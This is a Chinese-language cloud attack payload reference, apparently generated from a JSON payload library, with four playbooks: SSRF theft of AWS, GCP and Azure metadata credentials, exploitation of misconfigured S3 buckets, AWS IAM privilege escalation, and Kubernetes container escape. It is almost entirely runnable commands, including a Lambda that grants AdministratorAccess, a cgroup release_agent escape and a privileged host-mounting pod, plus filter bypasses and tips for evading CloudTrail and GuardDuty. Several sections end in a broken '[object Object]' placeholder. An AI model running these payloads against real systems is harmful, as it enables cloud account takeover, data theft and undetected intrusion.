# 云安全漏洞 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（4 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 云SSRF窃取元数据凭据

- **id:** `cloud-ssrf-metadata`
- **分类:** 云安全漏洞 / IMDS攻击
- **tags:** `云安全` `SSRF` `AWS` `GCP` `Azure` `IMDS` `元数据`

利用SSRF漏洞访问云服务(AWS/GCP/Azure)的实例元数据服务(IMDS)获取临时IAM凭据。攻击者可通过获取的Access Key接管云资源，实现从Web漏洞到云环境的横向升级。

**前置条件**

- 目标运行在云环境
- 存在SSRF漏洞
- 实例绑定了IAM角色

**利用步骤**

#### 1. AWS元数据服务探测

```
# IMDSv1——无需特殊Header
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/"

# 获取IAM角色名
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 获取临时凭据
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# 获取用户数据(可能包含启动脚本中的密钥)
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/user-data"
```

通过SSRF访问AWS EC2实例元数据服务获取IAM临时凭据

| 片段 | 说明 | 类型 |
|---|---|---|
| `169.254.169.254` | AWS/GCP/Azure通用的IMDS地址(Link-Local) | domain |
| `/latest/meta-data/` | AWS元数据API根路径 | path |
| `/iam/security-credentials/` | IAM角色临时凭据端点 | path |
| `/latest/user-data` | 实例用户数据——可能包含硬编码密钥 | path |

#### 2. GCP/Azure元数据利用

```
# GCP元数据——需要Metadata-Flavor头
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# GCP获取项目信息
curl -s "https://{TARGET}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"

# Azure管理令牌
curl -s "https://{TARGET}/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

获取GCP和Azure云环境的元数据凭据和管理令牌

| 片段 | 说明 | 类型 |
|---|---|---|
| `metadata.google.internal` | GCP元数据服务内部域名 | domain |
| `Metadata-Flavor: Google` | GCP强制要求的Header(防SSRF) | header |
| `Metadata: true` | Azure强制要求的Header | header |
| `/identity/oauth2/token` | Azure托管身份令牌端点 | path |

#### 3. 利用获取的凭据横向移动

```
# 配置AWS CLI使用窃取的凭据
export AWS_ACCESS_KEY_ID="{STOLEN_ACCESS_KEY}"
export AWS_SECRET_ACCESS_KEY="{STOLEN_SECRET_KEY}"
export AWS_SESSION_TOKEN="{STOLEN_SESSION_TOKEN}"

# 枚举权限
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name {ROLE_NAME}

# 列举S3桶
aws s3 ls

# 枚举EC2实例
aws ec2 describe-instances --query "Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,State:State.Name}"
```

使用窃取的云凭据通过AWS CLI枚举云资源和权限

| 片段 | 说明 | 类型 |
|---|---|---|
| `AWS_ACCESS_KEY_ID` | AWS访问密钥ID环境变量 | variable |
| `sts get-caller-identity` | 验证当前身份和账号信息 | command |
| `s3 ls` | 列举所有可访问的S3存储桶 | command |
| `--query` | JMESPath查询过滤输出 | parameter |

#### 4. 深度利用——S3数据泄露/权限提升

```
# S3桶数据下载
aws s3 sync s3://{BUCKET_NAME} ./loot/ --no-sign-request 2>/dev/null
aws s3 ls s3://{BUCKET_NAME} --recursive | head -50

# 检查是否可以提权
aws iam list-users
aws iam create-access-key --user-name admin 2>/dev/null
aws lambda list-functions
aws ssm describe-parameters

# 检查Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id {SECRET_NAME}
```

利用获取的云凭据导出S3数据、检查IAM提权可能性和提取密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `s3 sync` | 批量下载S3桶中的文件 | command |
| `create-access-key` | 为其他用户创建永久访问密钥(提权) | command |
| `secretsmanager get-secret-value` | 读取Secrets Manager中的敏感信息 | command |

**WAF 绕过**

#### 绕过SSRF的IMDS防护

```
# IMDSv2需要PUT获取Token——尝试Header注入
curl "https://{TARGET}/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT

# IP变形
http://[::ffff:169.254.169.254]
http://0xa9fea9fe
http://2852039166
http://169.254.169.254.nip.io

# DNS重绑定
http://169-254-169-254.attacker.com  # 解析到169.254.169.254

# 协议走私
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```

通过IP变形、DNS重绑定和协议走私绕过SSRF对IMDS地址的过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `0xa9fea9fe` | 169.254.169.254的十六进制表示 | encoding |
| `::ffff:169.254.169.254` | IPv6映射地址绕过IPv4过滤 | encoding |
| `gopher://` | Gopher协议走私HTTP请求 | technique |
| `nip.io` | 动态DNS服务——域名解析到对应IP | domain |

**教程**

[object Object]

---

### 2. S3存储桶配置错误利用

- **id:** `cloud-s3-misconfig`
- **分类:** 云安全漏洞 / S3安全
- **tags:** `云安全` `S3` `AWS` `配置错误` `数据泄露`

利用AWS S3存储桶的访问控制配置错误(公开读/写/列举)获取敏感数据或植入恶意文件。常见于静态网站托管、日志存储和备份桶，可能导致数据泄露、网站篡改或供应链攻击。

**前置条件**

- 已知目标S3桶名
- AWS CLI或HTTP访问

**利用步骤**

#### 1. S3桶名枚举

```
# 基于域名猜测桶名
for prefix in "" "www-" "dev-" "staging-" "backup-" "logs-" "assets-" "static-"; do
  for suffix in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets"; do
    bucket="${prefix}{COMPANY}${suffix}"
    aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "PUBLIC: $bucket"
  done
done

# DNS CNAME检查
dig +short CNAME {TARGET} | grep s3

# 从前端资源URL发现
curl -s "https://{TARGET}" | grep -oP "https?://[^"]+\.s3[^"]*amazonaws\.com[^"]+"
```

通过域名变体、DNS记录和前端代码发现目标S3存储桶

| 片段 | 说明 | 类型 |
|---|---|---|
| `--no-sign-request` | 不使用AWS凭据——测试匿名访问 | parameter |
| `.s3.amazonaws.com` | S3桶的标准URL格式 | domain |
| `CNAME` | 检查域名是否指向S3桶 | keyword |

#### 2. 权限枚举

```
# 测试列举权限
aws s3 ls "s3://{BUCKET}" --no-sign-request

# 测试读取权限
aws s3 cp "s3://{BUCKET}/index.html" /tmp/test --no-sign-request 2>/dev/null && echo "READ OK"

# 测试写入权限
echo "security-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://{BUCKET}/security-test.txt" --no-sign-request 2>/dev/null && echo "WRITE OK"

# 检查Bucket Policy
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request 2>/dev/null | jq

# 检查ACL
aws s3api get-bucket-acl --bucket {BUCKET} --no-sign-request 2>/dev/null | jq
```

测试S3桶的匿名列举、读取、写入权限和策略配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `get-bucket-policy` | 获取桶策略文档(定义了谁能做什么) | command |
| `get-bucket-acl` | 获取桶访问控制列表 | command |
| `s3 cp` | S3文件复制命令 | command |

#### 3. 敏感数据搜索

```
# 递归列举所有文件
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt

# 搜索敏感文件
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt

# 下载关键文件
for ext in .env .sql .bak .key .pem config.yml database.json; do
  aws s3 cp "s3://{BUCKET}/$ext" ./loot/ --recursive --exclude "*" --include "*$ext" --no-sign-request 2>/dev/null
done

# 搜索备份数据库
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | grep -iE "dump|backup|export" | head -20
```

枚举桶中所有文件并定向搜索下载敏感文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `--recursive` | 递归列举所有子目录 | parameter |
| `.sql|.bak|.env|.key|.pem` | 常见敏感文件扩展名 | technique |
| `--include "*$ext"` | 仅下载匹配特定后缀的文件 | parameter |

#### 4. 验证利用（静态网站篡改/XSS）

```
# 如果桶托管了静态网站且可写
# 检查是否为网站桶
aws s3api get-bucket-website --bucket {BUCKET} --no-sign-request 2>/dev/null

# 上传XSS测试页面(无害)
echo '<html><body><h1>Security Test</h1></body></html>' > /tmp/security-test.html
aws s3 cp /tmp/security-test.html "s3://{BUCKET}/security-test.html" \
  --content-type "text/html" --no-sign-request

# 验证是否可访问
curl -s "https://{BUCKET}.s3.amazonaws.com/security-test.html" | head

# 清理测试文件
aws s3 rm "s3://{BUCKET}/security-test.html" --no-sign-request
```

测试S3网站桶的写入权限并验证是否可托管自定义HTML(可导致XSS/篡改)

| 片段 | 说明 | 类型 |
|---|---|---|
| `get-bucket-website` | 检查桶是否配置为静态网站托管 | command |
| `--content-type "text/html"` | 设置MIME类型确保浏览器渲染HTML | parameter |

**WAF 绕过**

#### 绕过S3访问限制

```
# 使用不同区域端点
aws s3 ls "s3://{BUCKET}" --region us-west-2 --no-sign-request

# 使用路径格式(可能绕过某些WAF)
curl -s "https://s3.amazonaws.com/{BUCKET}/"
curl -s "https://s3.{REGION}.amazonaws.com/{BUCKET}/"

# 使用已认证但不同账号的AWS凭据
# (某些桶策略允许"AuthenticatedUsers"组)
aws s3 ls "s3://{BUCKET}" --profile any-aws-account

# Signed URL泄露搜索
# 在Google/GitHub搜索: "s3.amazonaws.com/{BUCKET}" "X-Amz-Signature"
```

通过区域端点变换、路径格式和已认证用户组绕过S3访问限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `s3.{REGION}.amazonaws.com` | 区域特定的S3端点 | domain |
| `AuthenticatedUsers` | AWS预定义组——任何已认证的AWS用户 | concept |
| `X-Amz-Signature` | S3预签名URL的签名参数 | header |

**教程**

[object Object]

---

### 3. AWS IAM权限提升

- **id:** `cloud-iam-escalation`
- **分类:** 云安全漏洞 / IAM提权
- **tags:** `云安全` `AWS` `IAM` `权限提升` `Privilege Escalation`

在已获取低权限AWS凭据后，利用IAM策略中的过度授权(如iam:PassRole、lambda:CreateFunction等)实现权限提升至管理员。涵盖20+种已知的AWS IAM提权路径。

**前置条件**

- 已获取AWS凭据
- IAM策略存在过度授权

**利用步骤**

#### 1. 枚举当前权限

```
# 基础身份信息
aws sts get-caller-identity

# 枚举当前用户的策略
aws iam list-user-policies --user-name {USERNAME}
aws iam list-attached-user-policies --user-name {USERNAME}

# 获取策略详情
aws iam get-policy-version --policy-arn {POLICY_ARN} --version-id v1 | jq '.PolicyVersion.Document'

# 使用enumerate-iam工具自动化
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}
```

枚举当前IAM身份的所有权限和策略

| 片段 | 说明 | 类型 |
|---|---|---|
| `get-caller-identity` | 获取当前调用者的ARN和账号ID | command |
| `list-attached-user-policies` | 列出用户关联的托管策略 | command |
| `.PolicyVersion.Document` | jq提取策略文档中的权限定义 | function |

#### 2. iam:PassRole + Lambda提权

```
# 创建恶意Lambda函数(需要iam:PassRole + lambda:CreateFunction)

# 创建Lambda代码
cat > /tmp/lambda.py << 'PYEOF'
import boto3
def handler(event, context):
    client = boto3.client("iam")
    # 为当前用户附加管理员策略
    client.attach_user_policy(
        UserName="low-priv-user",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {"status": "escalated"}
PYEOF

cd /tmp && zip lambda.zip lambda.py

# 创建Lambda并关联高权限角色
aws lambda create-function \
  --function-name security-test \
  --runtime python3.9 \
  --handler lambda.handler \
  --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}

# 触发执行
aws lambda invoke --function-name security-test /tmp/output.json
```

利用iam:PassRole和lambda:CreateFunction创建使用高权限角色的Lambda函数实现提权

| 片段 | 说明 | 类型 |
|---|---|---|
| `iam:PassRole` | 将IAM角色传递给其他服务的权限——提权核心 | keyword |
| `attach_user_policy` | 为用户附加策略——Lambda中使用高权限角色执行 | function |
| `AdministratorAccess` | AWS内置管理员策略——全部权限 | value |

#### 3. 其他提权路径

```
# 路径1: iam:CreatePolicyVersion
aws iam create-policy-version --policy-arn {POLICY_ARN} \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 路径2: iam:CreateAccessKey (为其他用户创建密钥)
aws iam create-access-key --user-name admin

# 路径3: iam:UpdateAssumeRolePolicy + sts:AssumeRole
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::{ACCOUNT}:user/low-priv"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::{ACCOUNT}:role/AdminRole --role-session-name escalation
```

展示多条IAM提权路径：策略版本覆盖、密钥创建和角色信任策略修改

| 片段 | 说明 | 类型 |
|---|---|---|
| `create-policy-version` | 创建新策略版本——覆盖原有权限定义 | command |
| `"Action":"*","Resource":"*"` | 全部权限策略——等同于管理员 | json |
| `update-assume-role-policy` | 修改角色信任策略——允许自己AssumeRole | command |

#### 4. 自动化提权工具

```
# PACU——AWS渗透测试框架
python3 pacu.py
# 在PACU中:
> import_keys {AK} {SK}
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# pmapper——IAM策略可视化和提权路径分析
pmapper graph --create
pmapper analysis --output-type text
pmapper visualize --filetype png

# cloudfox枚举
cloudfox aws --profile target all-checks
```

使用PACU、pmapper和cloudfox自动化发现和利用IAM提权路径

| 片段 | 说明 | 类型 |
|---|---|---|
| `pacu` | Rhino Security Labs的AWS利用框架 | command |
| `iam__privesc_scan` | PACU的IAM提权扫描模块 | command |
| `pmapper` | IAM策略图分析工具 | command |
| `cloudfox` | Bishop Fox的云安全枚举工具 | command |

**WAF 绕过**

#### 绕过CloudTrail和GuardDuty检测

```
# 使用非标准区域(可能未开启CloudTrail)
aws iam list-users --region af-south-1

# 低速操作避免触发异常检测
sleep $((RANDOM % 60 + 30))  # 30-90秒随机延迟

# 使用AWS服务间调用减少直接API日志
# 通过Lambda/SSM间接执行而非直接CLI调用

# 使用Session Token而非长期凭据
aws sts get-session-token --duration-seconds 3600
```

通过使用非标准区域、低速操作和会话令牌降低被检测的风险

| 片段 | 说明 | 类型 |
|---|---|---|
| `af-south-1` | 非洲区域——可能未配置完整的CloudTrail | value |
| `get-session-token` | 获取临时会话令牌减少长期凭据暴露 | command |

**教程**

[object Object]

---

### 4. Kubernetes容器逃逸

- **id:** `cloud-k8s-escape`
- **分类:** 云安全漏洞 / 容器安全
- **tags:** `云安全` `Kubernetes` `容器逃逸` `Docker` `特权容器`

在已获取Kubernetes Pod Shell的前提下，利用配置错误(特权容器、挂载宿主机路径、ServiceAccount高权限)实现容器逃逸，进而控制宿主机或整个Kubernetes集群。

**前置条件**

- 已获取Pod内Shell
- Pod存在配置错误

**利用步骤**

#### 1. 容器环境侦察

```
# 确认在容器中
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods"
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
env | grep KUBERNETES

# 检查ServiceAccount令牌
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 检查特权模式
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | head
capsh --print 2>/dev/null | grep "Current"
```

确认容器环境并检查特权模式、SA令牌和内核能力

| 片段 | 说明 | 类型 |
|---|---|---|
| `/proc/1/cgroup` | cgroup路径判断是否在容器中 | path |
| `/.dockerenv` | Docker容器标志文件 | path |
| `serviceaccount/token` | K8s自动挂载的SA JWT令牌 | path |
| `capsh --print` | 查看Linux Capabilities(内核能力) | command |

#### 2. 特权容器逃逸

```
# 方法1：挂载宿主机根文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法2：通过cgroup逃逸(CVE-2022-0492)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "#!/bin/sh" > /cmd
echo "id > /output" >> /cmd
chmod a+x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```

利用特权容器的磁盘挂载和cgroup release_agent实现宿主机命令执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `mount /dev/sda1` | 挂载宿主机磁盘——特权容器可直接访问设备 | command |
| `chroot` | 切换根目录到宿主机文件系统 | command |
| `release_agent` | cgroup的release_agent在宿主机上下文中执行 | keyword |
| `notify_on_release` | 启用cgroup释放通知触发release_agent | keyword |

#### 3. 利用ServiceAccount接管集群

```
# 读取SA Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 枚举权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'

# 列出所有Pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/pods"

# 列出Secrets
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$K8S/api/v1/secrets"
```

利用Pod中的ServiceAccount令牌通过K8s API枚举权限和获取集群Secrets

| 片段 | 说明 | 类型 |
|---|---|---|
| `KUBERNETES_SERVICE_HOST` | K8s自动注入的API Server地址 | variable |
| `SelfSubjectAccessReview` | K8s权限自检API | keyword |
| `/api/v1/secrets` | K8s Secrets API——可能包含其他服务凭据 | path |

#### 4. 创建特权Pod反弹Shell

```
# 如果SA有create pods权限
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$K8S/api/v1/namespaces/default/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "security-test-pod"},
    "spec": {
      "containers": [{
        "name": "test",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "apk add curl; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```

创建挂载宿主机根目录的特权Pod实现容器逃逸

| 片段 | 说明 | 类型 |
|---|---|---|
| `"privileged": true` | 特权容器——拥有宿主机全部Linux Capabilities | json |
| `"hostPath": {"path": "/"}` | 挂载宿主机根目录到容器内 | json |
| `security-test-pod` | 使用无害名称(非hack) | value |

**WAF 绕过**

#### 绕过PodSecurityPolicy/OPA

```
# 使用非default命名空间(可能未应用PSP)
curl -s "$K8S/api/v1/namespaces" -H "Authorization: Bearer $TOKEN" --cacert $CACERT | jq '.items[].metadata.name'

# 使用ephemeral容器(可能绕过PSP)
curl -s "$K8S/api/v1/namespaces/default/pods/{POD}/ephemeralcontainers" \
  -X PATCH -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{"spec":{"ephemeralContainers":[{"name":"debug","image":"alpine","command":["sh"]}]}}'

# 使用CronJob而非Pod(某些策略不覆盖)
curl -s "$K8S/apis/batch/v1/namespaces/default/cronjobs" ...
```

通过切换命名空间、使用临时容器和CronJob绕过Pod安全策略

| 片段 | 说明 | 类型 |
|---|---|---|
| `ephemeralContainers` | K8s临时容器——调试特性可能绕过安全策略 | keyword |
| `CronJob` | 定时任务资源——某些PSP未覆盖此资源类型 | keyword |

**教程**

[object Object]
